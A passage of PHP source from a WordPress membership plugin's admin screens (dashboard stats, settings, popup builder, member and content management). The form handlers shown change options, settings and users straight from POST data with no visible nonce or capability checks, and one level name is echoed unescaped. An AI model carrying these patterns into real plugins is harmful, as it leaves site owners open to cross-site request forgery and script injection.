		foreach ($membergenius->model->getMembersSince(time()-86400*30) as $row) {
			if (!isset($levels[$row->level_id])) { continue; }
			$levels[$row->level_id]->since30 = $row->total;
		}

		?>
		<form method="post" action="<?php echo $this->menu; ?>-members">
			<p>
				<input type="search" value="" name="s" placeholder="Search Members" ondblclick="membergenius_multisearch(this);">
				<input type="submit" class="button" value="Search">
			</p>

			<table class="widefat" style="width:100%;" id="membergenius_dashboard">
				<thead>
					<tr>
						<th scope="col" style="width:100px;">Level</th>
						<th scope="col" style="text-align:center;">Active</th>
						<th scope="col" style="text-align:center;">Canceled</th>
						<th scope="col" style="text-align:center;">Last 24 Hours</th>
						<th scope="col" style="text-align:center;">Last 7 Days</th>
						<th scope="col" style="text-align:center;">Last 30 Days</th>
					</tr>
				</thead>
				<tbody>
					<?php
					$totalActive = 0;
					$totalCanceled = 0;
					$prueba = $levels[0]->level_name;
					foreach ($levels as $level) {
						$totalActive += $level->active;
						$totalCanceled += $level->canceled;
						$since24 = 0;
						$since7 = 0;
						$since30 = 0;
						if (isset($level->since24)) {
							$since24 = intval($level->since24);
						}
						if (isset($level->since7)) {
							$since7 = intval($level->since7);
						}
						if (isset($level->since30)) {
							$since30 = intval($level->since30);
						}
					?>
						<tr>
							<td><a href="<?php echo $this->tabLink("members"); ?>&l=<?php echo intval($level->ID); ?>"><?php echo htmlentities($level->level_name); ?></a></td>
							<td align="center" style="font-weight:bold;"><?php echo intval($level->active); ?></td>
							<td align="center" style="font-weight:bold; color:red; text-decoration:line-through"><?php echo intval($level->canceled); ?></td>
							<td align="center" style="color:#AAAAAA; font-weight:bold;"><?php echo $since24; ?></td>
							<td align="center" style="color:#AAAAAA; font-weight:bold;"><?php echo $since7; ?></td>
							<td align="center" style="color:#AAAAAA; font-weight:bold;"><?php echo $since30; ?></td>
						</tr>
					<?php }; ?>
					<tr class="membergenius_separator">
						<td colspan="6" class="alternate">&nbsp;</td>
					</tr>
					<tr>
						<td style="vertical-align:middle;"><i><a href="<?php echo $this->tabLink("members"); ?>">Total Members</a></i></td>
						<td align="center" class="membergenius_total"><?php echo intval($membergenius->model->getMemberCount("A")); ?></td>
						<td align="center" colspan="4">&nbsp;</td>
					</tr>
				</tbody>
			</table>
		</form>
		<div style="clear:both; width:100%; margin-top:20px; text-align:center;">
	      	<a class="recent_link" href="#" style="font-weight:bold;" onclick="jQuery('.recent_link').css('font-weight', 'normal'); jQuery(this).css('font-weight', 'bold'); jQuery('#membergenius_recent_signups').show(); jQuery('#membergenius_recent_logins').hide(); return false;">Recent Signups</a> - <a class="recent_link" href="#" onclick="jQuery('.recent_link').css('font-weight', 'normal'); jQuery(this).css('font-weight', 'bold'); jQuery('#membergenius_recent_signups').hide(); jQuery('#membergenius_recent_logins').show(); return false;">Recent Logins</a>
        </div>

		<?php

 		$recentSignupScroll = count($recent_signups) > 5;
		$recentLoginScroll = count($recent_logins) > 5;

		?>
      	<div id="membergenius_recent_signups"<?php if ($recentSignupScroll): ?> style="height:150px; overflow:auto;"<?php endif; ?>>
	      	<ul>
		      <?php foreach ($recent_signups as $recent_signup): ?>
		         <li>
		            <a href="<?php echo get_edit_user_link($recent_signup->ID); ?>"><?php echo htmlentities($recent_signup->user_login); ?></a>
		            <span style="float:right;"><?php echo htmlentities($recent_signup->user_registered); ?> (<?php echo $this->timesince(strtotime($recent_signup->user_registered)); ?>)</span>
		         </li>
		      <?php endforeach; ?>
		    </ul>
		</div>
	    <div id="membergenius_recent_logins" <?php if ($recentLoginScroll): ?>style="display:none; height:150px; overflow:auto;"<?php endif; ?>>
	      	<ul>
		      	<?php foreach ($recent_logins as $recent_login): ?>
			        <li>
			            <a href="<?php echo get_edit_user_link($recent_login->ID); ?>"><?php echo htmlentities($recent_login->user_login); ?></a>
			            <span style="float:right;"><?php echo date(chr(89) . "-m-d H:i:s", $recent_login->user_value); ?> (<?php echo $this->timesince($recent_login->user_value); ?>)</span>
			        </li>
		      	<?php endforeach; ?>
	  		</ul>
        </div>

      	<?php $this->javascript(); ?>

		<style type="text/css">
			<!--
			#membergenius_dashboard thead tr th, #membergenius_dashboard tbody tr td { font-size:14px; }
			div.inside form #membergenius_dashboard thead tr th, div.inside form #membergenius_dashboard tbody tr td {
				font-size:12px;
				padding:8px 4px !important;
			}
			.membergenius_total {
				padding:5px; font-weight:bold; font-size:22px !important;
			}
			div.inside form #membergenius_dashboard tbody tr.membergenius_separator { display:none; }
			-->

		</style>

		<?php $this->menu_dashboard_chart(); ?>
		<?php
	}

	public function javascript() { ?>
		<script type="text/javascript">
			<!--
			function membergenius_video(caller, slug) {
				jQuery(caller).css("display", "block").html('<iframe style="max-width:100%; padding:10px;" width="1024" height="600" src="https://www.youtube.com/embed/'+slug+'?autoplay=1&rel=0&showinfo=0" frameborder="0" border="0" allowfullscreen></iframe>').blur();
				return false;
			}
			function membergenius_multisearch(caller) {
				var textarea = document.createElement('textarea');
				textarea.value = jQuery(caller).val();

				textarea.name = jQuery(caller).attr("name");
				textarea.placeholder = jQuery(caller).attr("placeholder");

				if (jQuery(caller).parents(".inside").length == 1) {
					textarea.cols = 50;
				}
				else {
					textarea.cols = 80;
				}
				textarea.rows = 5;

				jQuery(caller).after('<br />');
				jQuery(caller).replaceWith(textarea).focus();
			}
			function membergenius_change() {
				var action = jQuery("#membergenius_action").val();
				var levels = jQuery("#membergenius_levels");

				if (action == "move" || action == "add" || action == "remove" || action == "cancel" || action == "uncancel") {
					levels.show();
				}
				else {
					levels.hide();
				}
			}
			function membergenius_confirm() {
				var message = 'Are you SURE you want to delete the selected members? This action cannot be undone. Click OK to Continue, or Cancel to stop.';
				return confirm(message);
			}
			// -->
		</script>
      <?php
	}

	public function menu_dashboard_chart() {
		global $membergenius;
		$firstMember = $membergenius->model->getMembers("number=1&orderby=registered&order=ASC");
		if (!$firstMember) { return; }
		if (!isset($firstMember[0]->user_registered)) { return; }
		$firstDate = strtotime($firstMember[0]->user_registered);
		if ($firstDate >= time()) { return; }
		$start_year = date(chr(89), $firstDate);
		$start_month = date("n", $firstDate);
		$end_year = date(chr(89));
		$end_month = date("n");
		$monthDiff = (($end_year-$start_year)*12) + ($end_month-$start_month);
		$months = array();
		$year = date(chr(89));
		$month = date("n");
		for ($i=0;$i<=$monthDiff;$i++) {
			$start = mktime(0, 0, 0, $start_month+$i, 1, $start_year);
			$end = mktime(0, 0, 0, $start_month+$i+1, 1, $start_year);
			$key = date("F ".chr(89), $start);
			$months[$key] = array( "active" => $membergenius->model->getMemberCount("A", 0, $end), "canceled" => $membergenius->model->getMemberCount("C", $start, $end), "thisMonth" => $membergenius->model->getMemberCount(null, $start, $end) );
		}
		?>
		<div id="membergenius_chart" style="background-color:transparent; margin-left:-20px; height: 200px;"></div>
			<script type="text/javascript" src="//www.google.com/jsapi"></script>
			<script type="text/javascript">
				google.load('visualization', '1', {packages: ['corechart']});
			</script>
			<script type="text/javascript">
				var chartWidth;
				if (jQuery("#membergenius.postbox").length == 0) { chartWidth = 700; }
				else { chartWidth = 450; }

				function drawVisualization() {
				// Create and populate the data table.
					var data = google.visualization.arrayToDataTable([['x', 'Members', 'Cancellations']
					<?php foreach ($months as $month => $members): ?>
					<?php $newMembers = $members["thisMonth"]; $activeMembers = @intval($members["active"]); $canceledMembers = @intval($members["canceled"]); ?> ,['<?php echo htmlentities($month); ?>',
					{v:<?php echo $activeMembers; ?>, f:'<?php echo $activeMembers; ?> Total, <?php echo $newMembers; ?> New'},
					<?php echo $canceledMembers; ?>]
					<?php endforeach; ?>
					]);

				// Create and draw the visualization.
					new google.visualization.LineChart(document.getElementById('membergenius_chart')).
						draw(data, {curveType: "none",
							backgroundColor:"transparent",
							width: chartWidth, height: 200,
							colors:['#018BCE', '#ce0000'],
							legend:{position:"none"},
							pointSize:5,
							vAxis:{viewWindow:{min:0}}
						}
					);
				}
				google.setOnLoadCallback(drawVisualization);
			</script>
		<?php
	}

	public function menu_settings() {
		global $membergenius;
		if (isset($_POST["membergenius_settings_nonmember_url"])) {
			if (isset($_POST["membergenius_settings_notify"])) {
				$membergenius->model->setting("notify", 1);
			} else {
				$membergenius->model->setting("notify", 0);
			}
			if (isset($_POST["membergenius_settings_profile"])) {
				$membergenius->model->setting("profile", 1);
			} else {
				$membergenius->model->setting("profile", 0);
			}
			if (isset($_POST["membergenius_settings_front_page"]) && is_numeric($_POST["membergenius_settings_front_page"])) {
				if ($_POST["membergenius_settings_front_page"] == 0) {
					update_option("show_on_front", "posts");
					update_option("page_on_front", 0);
				} else {
					update_option("show_on_front", "page");
					update_option("page_on_front", $_POST["membergenius_settings_front_page"]);
				}
			}
			if (isset($_POST["membergenius_settings_order"])) {
				$membergenius->model->setting("order", stripslashes($_POST["membergenius_settings_order"]));
			}
			if (isset($_POST["membergenius_settings_header"])) {
				$membergenius->model->setting("header", stripslashes($_POST["membergenius_settings_header"]));
			}
			if (isset($_POST["membergenius_settings_footer"])) {
				$membergenius->model->setting("footer", stripslashes($_POST["membergenius_settings_footer"]));
			}
			if (isset($_POST["membergenius_settings_support"])) {
				$membergenius->model->setting("support", stripslashes($_POST["membergenius_settings_support"]));
			}
			if (isset($_POST["membergenius_settings_affiliate"])) {
				if (isset($_POST["membergenius_settings_attribution"])) {
					$membergenius->model->setting("attribution", 1);
				} else {
					$membergenius->model->setting("attribution", 0);
				}
				if (isset($_POST["membergenius_settings_emailattribution"])) {
					$membergenius->model->setting("emailattribution", 1);
				} else {
					$membergenius->model->setting("emailattribution", 0);
				}
				$affiliate = stripslashes($_POST["membergenius_settings_affiliate"]);
				$membergenius->model->setting("affiliate", $affiliate);
			}
			if (isset($_POST["membergenius_settings_nonmember_page"])) {
				$membergenius->model->setting("nonmember_page", @intval($_POST["membergenius_settings_nonmember_page"]));
			}
			if (isset($_POST["membergenius_settings_nonmember_url"])) {
				$membergenius->model->setting("nonmember_url", stripslashes($_POST["membergenius_settings_nonmember_url"]));
			}
			if (isset($_POST["membergenius_settings_logout_page"])) {
				$membergenius->model->setting("logout_page", @intval($_POST["membergenius_settings_logout_page"]));
			}
			if (isset($_POST["membergenius_settings_logout_url"])) {
				$membergenius->model->setting("logout_url", stripslashes($_POST["membergenius_settings_logout_url"]));
			}
		}

		$notify = $membergenius->model->setting("notify")==1;
		$profiles = $membergenius->model->setting("profile")==1;
		$order = $membergenius->model->setting("order");
		$header = $membergenius->model->setting("header");
		$footer = $membergenius->model->setting("footer");
		$attribution = $membergenius->model->setting("attribution")==1;
		$emailattribution = $membergenius->model->setting("emailattribution")==1;
		$affiliate = $membergenius->model->setting("affiliate");
		$support = $membergenius->model->setting("support");
		$nonmember_page = @intval($membergenius->model->setting("nonmember_page"));
		$nonmember_url = $membergenius->model->setting("nonmember_url");
		if (!$nonmember_url) { $nonmember_url = ((is_ssl()) ? "https://" : "http://"); }
		$logout_page = @intval($membergenius->model->setting("logout_page"));
		$logout_url = $membergenius->model->setting("logout_url");
		if (!$logout_url) { $logout_url = ((is_ssl()) ? "https://" : "http://"); }
		$pages = get_pages();
		$front_page = 0;
		if (get_option("show_on_front") == "page") { $front_page = @intval(get_option("page_on_front")); } ?>
		<div class="wrap" style="clear:both; width:1000px;">
			<?php $this->menu_header("Settings"); ?>
			<form method="POST">
				<?php if (count($_POST) > 0): ?>
				<div class="updated">Settings saved.</div>
				<?php endif; ?>
				<h3>Customizations</h3>
				<p><label><input type="checkbox" name="membergenius_settings_notify" <?php checked($notify); ?> /> Email the site administrator <code><?php echo htmlentities(get_option("admin_email")); ?></code> about every transaction (including refunds) sent to this membership site?</label></p>
				<p><label><input type="checkbox" name="membergenius_settings_profile" <?php checked($profiles); ?> /> Allow users to view and edit <a target="_blank" href="<?php echo get_edit_user_link(); ?>">their own profile information</a>?</label></p>
				<h3>Front Page</h3>
				<blockquote>
					<p>If you're using WordPress to host your sales letter separately (i.e. a separate WordPress installation at <code>example.com</code> and this membership site at <code>example.com/members</code>), we recommend you leave these settings alone.</p>
					<p>On the other hand, if you're using this WordPress site to host BOTH your membership site and sales letter, set the &quot;front page&quot; below to be the front page for logged-in members, and the &quot;non-member&quot; page to be your sales letter, where members can click a button to buy access into your membership site.</p>
					<p><label>Front Page:</label>
						<select name="membergenius_settings_front_page">
							<option value="0" <?php selected($front_page == 0); ?>>(No Default Page)</option>
							<?php foreach ($pages as $page): ?>
							<?php
							if ($page->post_name == "wishlist-member") { continue; }
							if ($page->post_name == "membergenius") { continue; }
							if ($page->post_name == "copyright") { continue; }
							if ($page->post_name == "disclaimer") { continue; }
							if ($page->post_name == "earnings") { continue; }
							if ($page->post_name == "privacy") { continue; }
							if ($page->post_name == "terms-conditions") { continue; }
							?>
							<option <?php selected($front_page == $page->ID); ?> value="<?php echo intval($page->ID); ?>"><?php echo htmlentities($page->post_title); ?></option>
							<?php endforeach; ?>
						</select>
						<?php if ($front_page > 0): ?>
							<a target="_blank" href="<?php echo get_permalink($front_page); ?>">View Front Page</a>
						<?php endif; ?>
					</p>
					<p><label>Non-Member Page:</label>
						<select name="membergenius_settings_nonmember_page" onchange="jQuery('#membergenius_settings_nonmember_url').attr('disabled', this.value!=0);">
							<option value="" <?php selected($nonmember_page == 0); ?>>Enter an external URL below...</option>
							<option value="-1" <?php selected($nonmember_page == "-1"); ?>>[WordPress Login Page]</option>
							<?php foreach ($pages as $page): ?>
							<?php if ($page->post_name == "wishlist-member") { continue; } if ($page->post_name == "membergenius") { continue; } if ($page->post_name == "copyright") { continue; } if ($page->post_name == "disclaimer") { continue; } if ($page->post_name == "earnings") { continue; } if ($page->post_name == "privacy") { continue; } if ($page->post_name == "terms-conditions") { continue; } if ($membergenius->model->isProtected($page->ID)) { continue; } ?>
							<option <?php selected($nonmember_page == $page->ID); ?> value="<?php echo intval($page->ID); ?>"><?php echo htmlentities($page->post_title); ?></option>
							<?php endforeach; ?>
						</select>
						<small>(external URL or <a href="<?php echo $this->tabLink("content&membergenius_action=pages&l=-1"); ?>">UNPROTECTED page</a> on your site)</small><br/>
						<input type="text" id="membergenius_settings_nonmember_url" name="membergenius_settings_nonmember_url" size="65" <?php disabled($nonmember_page != 0); ?> value="<?php echo htmlentities($nonmember_url); ?>" <?php disabled($nonmember_page != 0); ?> />
						<?php if ($nonmember_page == 0 && $nonmember_url || $nonmember_page > 0): ?>
						<?php
							if ($nonmember_page == 0) {
								$nonmember_link = $nonmember_url;
							} else {
								$nonmember_link = get_permalink($nonmember_page);
							}
						?>
						<a target="_blank" href="<?php echo htmlentities($nonmember_link); ?>">View Non-Member Page</a>
						<?php endif; ?>
					</p>
					<p><label>Log-Out Page:</label>
						<select name="membergenius_settings_logout_page" onchange="jQuery('#membergenius_settings_logout_url').attr('disabled', this.value!=0);">
							<option value="" <?php selected($logout_page == 0); ?>>Enter an external URL below...</option>
							<option value="-1" <?php selected($logout_page == "-1"); ?>>[WordPress Login Page]</option>
							<?php foreach ($pages as $page): ?>
							<?php
							if ($page->post_name == "wishlist-member") { continue; }
							if ($page->post_name == "membergenius") { continue; }
							if ($page->post_name == "copyright") { continue; }
							if ($page->post_name == "disclaimer") { continue; }
							if ($page->post_name == "earnings") { continue; }
							if ($page->post_name == "privacy") { continue; }
							if ($page->post_name == "terms-conditions") { continue; }
							if ($membergenius->model->isProtected($page->ID)) { continue; }
							?>
							<option <?php selected($logout_page == $page->ID); ?> value="<?php echo intval($page->ID); ?>"><?php echo htmlentities($page->post_title); ?></option>
							<?php endforeach; ?>
						</select>
						<small>(external URL or <a href="<?php echo $this->tabLink("content&membergenius_action=pages&l=-1"); ?>">UNPROTECTED page</a> on your site)</small><br/>
						<input type="text" id="membergenius_settings_logout_url" name="membergenius_settings_logout_url" size="65" <?php disabled($logout_page != 0); ?> value="<?php echo htmlentities($logout_url); ?>" <?php disabled($logout_page != 0); ?> />
						<?php if ($logout_page == 0 && $logout_url || $logout_page > 0): ?>
						<?php
						if ($logout_page == 0) {
							$logout_link = $logout_url;
						} else {
							$logout_link = get_permalink($logout_page);
						}
						?>
						<a target="_blank" href="<?php echo htmlentities($logout_link); ?>">View Log-Out Page</a>
						<?php endif; ?>
					</p>
				</blockquote> <!-- h3 front page -->
				<p><input type="submit" class="button-primary" value="Save All Changes" /></p>
				<h3>Post Sort Order</h3>
				<blockquote>
					<p>If you want to change the order that posts are shown (such as oldest to newest or newest to oldest), change that here.</p>
					<label><input type="radio" name="membergenius_settings_order" value="descending" <?php checked($order == "descending"); ?> /> Newest On Top, Oldest on Bottom <em>(descending)</em></label><br />
					<label><input type="radio" name="membergenius_settings_order" value="ascending" <?php checked($order == "ascending"); ?> /> Oldest On Top, Newest on Bottom <em>(ascending)</em></label>
				</blockquote>
				<h3>Offsite Links</h3>
				<p>MiembroPress can display these links at the bottom of your membership site, no matter what theme you are currently using.</p>
				<blockquote>
					<p><b>Support Desk:</b> We recommend you setup ONE support ticket system using <a href="https://ticketsystem.pro" target="_blank">Ticket System Plugin</a> so you only need to check one location for customer support issues such as lost passwords, pre-sales questions, or refund requests.</p>
					<p><label>Support Desk URL: <input type="text" name="membergenius_settings_support" value="<?php echo htmlentities($support); ?>" class="code" size="35" /></label> <small>(must include &quot;http://&quot; in web address)</small></p>
					<p><b>Affiliate Link:</b> If you would like to promote the MiembroPress plugin to your members and earn a commission, please <a target="_blank" href="https://miembropress.com/afiliados/">register for our affiliate program</a>.</p>
					<p> Affiliate URL (optional): <label><input type="text" name="membergenius_settings_affiliate" size="35" value="<?php echo htmlentities($affiliate); ?>" /></label><br /></p>
					<label><input type="checkbox" name="membergenius_settings_attribution" <?php checked($attribution); ?> /> Show Link in Site Footer</label> <label><input type="checkbox" name="membergenius_settings_emailattribution" <?php checked($emailattribution); ?> /> Send Link in Email Notifications</label>
				</blockquote>
				<p><input type="submit" class="button-primary" value="Save All Changes" /></p>
			</form>
		</div>
		<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
		<script type="text/javascript">
			$(function () {
				$("#require_gdpr").click(function () {
					if ($(this).is(":checked")) {
						$(".kingdomresponse-gdpr").show();
					} else {
						$(".kingdomresponse-gdpr").hide();
					}
				});
			});
		</script>
      <?php
	}

	public function menu_popup() {
		global $membergenius;
		if (isset($_POST["membergenius_settings_header"])) {
			if (isset($_POST["membergenius_settings_header"])) {
				$membergenius->model->setting("header", stripslashes($_POST["membergenius_settings_header"]));
			}
			if (isset($_POST["membergenius_settings_footer"])) {
				$membergenius->model->setting("footer", stripslashes($_POST["membergenius_settings_footer"]));
			}
		}
		$header = $membergenius->model->setting("header");
		$footer = $membergenius->model->setting("footer");
		?>
		<div class="wrap" style="clear:both; width:1000px;">
			<?php $this->menu_header("Popup"); ?>
			<h3 class="espacio-steps">To configure the Maximizer you must pay attention to the following instructions.</h3>
			<h3><span class="fondo-steps">Step 1:</span> Create Content.</h3>
			<h3 class="espacio-steps">Here you have two options to create the content.
			<br />
			Choose one of the two OPTIONS below:</h3>
			<h3>- OPTION A) Add content of the maximizer popup by text:</h3>
			<form id="form" action="<?php echo plugins_url( 'popup.php', __FILE__ ) ?>" method="get" target="_blank">
				<!-- Inicio titulo popup -->
				<label for="title-popup">Enter title of your popup:</label>
				<input type="text" name="title-popup" placeholder="Enter title" />
				&nbsp;
				<label for="title-color">Select color of title popup:</label>
				<input type="color" name="title-color" />
				<br /><br />
				<!-- Fin title -->
				<!-- Inicio contenido popup -->
				<label for="content-popup">Enter content of your popup:</label>
				<textarea style="margin-bottom: -4px;" type="text" name="content-popup" placeholder="Enter content"></textarea>
				&nbsp;
				<label for="content-color">Select color of content popup:</label>
				<input type="color" name="content-color"/>
				<br /><br />
				<label for="content-link">Enter link for content popup:</label>
				<input type="url" name="content-link" placeholder="Enter link"/>
				<label for="text-link">Enter text for this link:</label>
				<input type="text" name="text-link" placeholder="Enter description link"/>
				<br /><br />
				<!-- Fin contenido popup -->

				<h3>- OPTION B) Add content of the maximizer popup by HTML code:</h3>
				<h4>Enter code html for your title:</h4>
				<textarea name="title-html" class="code" cols="90" rows="7" style="font-size:11px;"></textarea>
				<br /><br /><br /><hr />
				<h4>Enter code html for your content:</h4>
				<textarea name="content-html" class="code" cols="90" rows="7" style="font-size:11px;"></textarea>
				<br /><br /><hr /><br />


				<!-- Start Select position popup -->
				<label for="posicion" class="step2-popup"><span class="fondo-steps">Step 2:</span> Select a position for your popup:</label>
				<select name="posicion">
					<option value="izquierda">Izquierda</option>
					<option value="derecha">Derecha</option>
				</select>
				<br /><br /><hr /><br />
				<!-- End Select position popup -->

				<h3><span class="fondo-steps">Step 3:</span> Generate Popup Maximizer.<br />
				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Just click on the button below and a window with more instructions will open.
				</h3>
				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<button class="button-primary">Generate Popup</button>
			</form>

			<br /><br /><hr /><br />
			<form method="POST">
				<?php if (count($_POST) > 0): ?>
				<div class="updated">Settings saved.</div>
				<?php endif; ?>
				<h3><span class="fondo-steps">Step 4:</span>
				Paste the generated code below and click "Save All Changes"
				</h3>
				<blockquote>
					<p hidden><strong>Sitewide Header:</strong><br />
					<textarea name="membergenius_settings_header" class="code" cols="90" rows="7" style="font-size:11px;"><?php echo htmlentities($header); ?></textarea></p>
					<textarea name="membergenius_settings_footer" class="code" cols="90" rows="7" style="font-size:11px;"><?php echo htmlentities($footer); ?></textarea></p>
				</blockquote>
				<p><input type="submit" class="button-primary" value="Save All Changes" /></p>
			</form>
		</div>
      <?php
	}

	private function timesince($tsmp) {
		$diffu = array( 'seconds'=>2, 'minutes' => 120, 'hours' => 7200, 'days' => 172800, 'months' => 5259487, 'years' => 63113851 );
		$diff = time() - ($tsmp);
		$dt = '0 seconds ago';
		foreach($diffu as $u => $n){
			if($diff>$n) {
				$dt = floor($diff/(.5*$n)).' '.$u.' ago';}
			}
		return $dt;
	}

	public function menu_members() {
		global $membergenius;
		$message = null;
		$messageLevels = null;
		$users = array();
		if (isset($_POST["membergenius_users"])) {
			$users = $_POST["membergenius_users"];
		}
		$action = (isset($_GET["membergenius_action"])) ? $_GET["membergenius_action"] : "members";
		$levels = null;
		if (isset($_POST["membergenius_levels"]) && is_numeric($_POST["membergenius_levels"])) {
			$levels = intval($_POST["membergenius_levels"]);
		}
		if (isset($_POST["membergenius_users"]) && is_array($_POST["membergenius_users"])) {
			foreach ($users as $user) {
				if (isset($_POST["membergenius_action_move"])) {
					$membergenius->model->move($user, $levels);
					$message = "move";
					$messageLevels = $levels;
				} elseif (isset($_POST["membergenius_action_add"])) {
					$membergenius->model->add($user, $levels);
					$message = "add";
					$messageLevels = $levels;
				} elseif (isset($_POST["membergenius_action_remove"])) {
					$membergenius->model->remove($user, $levels);
					$message = "remove";
					$messageLevels = $levels;
				} elseif (isset($_POST["membergenius_action_cancel"])) {
					$membergenius->model->cancel($user, $levels);
					$message = "cancel";
					$messageLevels = $levels;
				} elseif (isset($_POST["membergenius_action_uncancel"])) {
					$membergenius->model->uncancel($user, $levels);
					$message = "uncancel";
					$messageLevels = $levels;
				} elseif (isset($_POST["membergenius_action_delete"])) {
					$membergenius->model->deleteUser($user);
					$message = "delete";
					$messageLevels = $levels;
				}
			}
		}
		if (isset($_POST["membergenius_temps_delete"]) && isset($_POST["membergenius_temps"]) && is_array($_POST["membergenius_temps"])) {
			foreach (array_keys($_POST["membergenius_temps"]) as $temp) {
				$membergenius->model->deleteTemp($temp);
			}
		} elseif (isset($_POST["membergenius_temps_complete"]) && isset($_POST["membergenius_temps"]) && is_array($_POST["membergenius_temps"])) {
			foreach (array_keys($_POST["membergenius_temps"]) as $temp) {
				$membergenius->model->completeTemp($temp);
			}
		}

		$newuser = false;

		if (isset($_POST["action"]) && $_POST["action"] == "miembropress_register") {
			$create = intval($this->create());
			if ($create == 0 || !is_numeric($create)) {
				$newuser = true;
			}
		}
		?>
		<div class="wrap" style="clear:both; width:900px;">
			<?php $this->menu_header("Members"); ?>

			<h3 class="nav-tab-wrapper menu-tabs-wrapper">
				<a class="nav-tab<?php if ($action == "members"): ?> nav-tab-active<?php endif; ?>" href="?page=<?php echo plugin_basename('miembro-press/miembro-press.php'); ?>-members&membergenius_action=members">Manage Members (<?php echo $membergenius->model->getMemberCount(); ?>)</a>
				<a class="nav-tab<?php if ($action == "incomplete"): ?> nav-tab-active<?php endif; ?>" href="?page=<?php echo plugin_basename('miembro-press/miembro-press.php'); ?>-members&membergenius_action=incomplete">Incomplete Registrations (<?php echo $membergenius->model->getTempCount(); ?>)</a>
				<a class="nav-tab<?php if ($action == "export"): ?> nav-tab-active<?php endif; ?>" href="?page=<?php echo plugin_basename('miembro-press/miembro-press.php'); ?>-members&membergenius_action=export">Export</a>
			</h3>

			<?php
			if ($this->activation->key != null) {
				if ($newuser) {
					$this->register();
				} elseif ($action == "members") {
					$this->menu_members_list($message, $messageLevels);
				} elseif ($action == "incomplete") {
					$this->menu_members_temp();
				} elseif ($action == "export") {
					$this->menu_members_export();
				}
			}
			?>
		</div>
		<?php
	}

	public function menu_content() {
		global $membergenius;
		$levels = $membergenius->model->getLevels();
		$currentLevel = -1;
		if (isset($_REQUEST["l"])) {
			$currentLevel = intval($_REQUEST["l"]);
		} elseif (isset($_REQUEST["membergenius_level"])) {
			$currentLevel = intval($_REQUEST["membergenius_level"]);
		} elseif ($firstLevel = reset($levels)) {
			$currentLevel = $firstLevel->ID;
		}
		$currentLevelName = "";
		if ($currentLevel > 0 && isset($levels[$currentLevel]) && isset($levels[$currentLevel]->level_name)) {
			$currentLevelName = $levels[$currentLevel]->level_name;
		}
		$levelInfo = $membergenius->model->getLevel($currentLevel);
		$saveLevel = null;
		if (isset($_POST["membergenius_save"])) {
			$saveLevel = intval($_POST["membergenius_save"]);
		}
		if (isset($_POST["membergenius_posts"]) && is_array($_POST["membergenius_posts"]) && $saveLevel !== null) {
			foreach (array_keys($_POST["membergenius_posts"]) as $post) {
				$post = intval($post);
				if (isset($_POST["membergenius_checked"][$post])) {
					$membergenius->model->protect($post, $saveLevel);
				} else {
					$membergenius->model->unprotect($post, $saveLevel);
				}
			}
		}
		$action = "posts";
		if (isset($_REQUEST["membergenius_action"])) {
			$action = $_REQUEST["membergenius_action"];
		}
		if ($action == "posts") {
			$posts = get_posts("posts_per_page=-1");
		} elseif ($action == "pages") {
			$posts = get_pages("posts_per_page=-1");
		}
		$postAccess = $membergenius->model->getPostAccess($currentLevel);
		$allLevels = $membergenius->model->getLevels();
		?>
		<div class="wrap" style="clear:both;">
			<?php $this->menu_header("Content"); ?>
			<h3 class="nav-tab-wrapper menu-tabs-wrapper">
				<a class="nav-tab<?php if ($action == "posts"): ?> nav-tab-active<?php endif; ?>" href="?page=<?php echo plugin_basename('miembro-press/miembro-press.php'); ?>-content&membergenius_action=posts&membergenius_level=<?php echo $currentLevel; ?>">Posts</a>
				<a class="nav-tab<?php if ($action == "pages"): ?> nav-tab-active<?php endif; ?>" href="?page=<?php echo plugin_basename('miembro-press/miembro-press.php'); ?>-content&membergenius_action=pages&membergenius_level=<?php echo $currentLevel; ?>">Pages</a>
			</h3>
			<?php if ($action == "posts"): ?><h3>Manage Posts</h3><?php endif; ?>
			<?php if ($action == "pages"): ?><h3>Manage Pages</h3><?php endif; ?>
			<p>Choose which content is shown to the everyone, and which is shown to members only in the Protection menu.<br /> If a box is checked in Protection, that means it is protected and viewable to members only.</p>
			<p>Then choose one of your membership levels to assign that post or page to that level.</p>
			<p>For example, if a post is NOT checked for the Full level, then a user on the Full level does not have access to it.<br /> If a checkbox for a post IS checked, then any user on the Full level will be able to see it.</p>
			<p>If a box cannot be unchecked (it is grayed out) that means that the level has been set to have access to ALL content.<br /> You can go back to the Levels tab, uncheck &quot;All Posts &amp; Pages&quot; then return here to control access for that post and level.</p>
			<form method="post">
				<input type="hidden" name="membergenius_save" value="<?php echo intval($currentLevel); ?>" />
				<h3>Manage Access<?php
				if ($currentLevelName) {
					echo " (" . htmlentities($currentLevelName) . ")";
				} ?>
				</h3>
				<p>Choose a Membership Level:
					<a <?php if (-1 == $currentLevel): ?>style="font-weight:bold; color:red;"<?php endif; ?>href="<?php echo $this->tabLink("content") . "&l=-1"; ?>">Protection</a> &nbsp;&nbsp;
					<?php foreach ($levels as $level): ?>
					<a <?php if (is_numeric($currentLevel) && $level->ID == $currentLevel): ?>style="font-weight:bold; color:red;"<?php endif; ?> href="<?php echo $this->tabLink("content") . "&l=".intval($level->ID) . "&membergenius_action=".$action ; ?>"><?php echo htmlentities($level->level_name); ?></a> &nbsp;&nbsp;
					<?php endforeach; ?>
				</p>

				<?php if ($currentLevelName): ?><p><a href="<?php echo admin_url("post-new.php?post_type=" . (($action == "posts") ? "post" : "page") . "&membergenius_new=" . $currentLevel); ?>" class="add-new-h2" style="top:0px;">Add New <?php echo (($action == "posts") ? 'Post' : 'Page'); ?> on &quot;<?php echo $currentLevelName; ?>&quot; Level</a></p><?php endif; ?>
				<table class="widefat" style="width:500px;">
					<thead>
						<tr>
							<th nowrap="" scope="col" class="check-column" style="white-space:nowrap"><input type="checkbox" /></th>
							<th scope="col" style="width:100px;">Date</th>
							<th scope="col">Title</th>
							<th scope="col">Levels</th>
							<th scope="col" style="width:100px;">Status</th>
						</tr>
					</thead>
					<tbody>
						<?php foreach ($posts as $post): ?>
						<?php
						if ($post->post_name == "wishlist-member" || $post->post_name == "membergenius") {
							continue;
						}
						?>
						<?php
						$checked = in_array($post->ID, $postAccess);
						$disabled = false;
						if ($currentLevel == -1) { $checked = !$checked; }
